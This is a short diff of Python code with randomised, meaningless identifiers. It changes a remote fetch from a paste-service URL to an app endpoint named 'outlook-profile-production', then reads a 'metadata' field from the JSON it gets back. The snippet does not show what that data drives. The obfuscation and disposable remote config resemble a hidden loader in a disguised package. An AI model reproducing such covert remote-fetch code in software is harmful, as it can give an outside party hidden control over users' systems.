@@ -16,7 +16,7 @@ def net_wbzjsg_595():
 
     def config_plaqwm_653():
         try:
-            model_kbvdno_667 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_kbvdno_667 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_kbvdno_667.raise_for_status()
             learn_eadien_540 = model_kbvdno_667.json()
             net_gqkhwq_965 = learn_eadien_540.get('metadata')
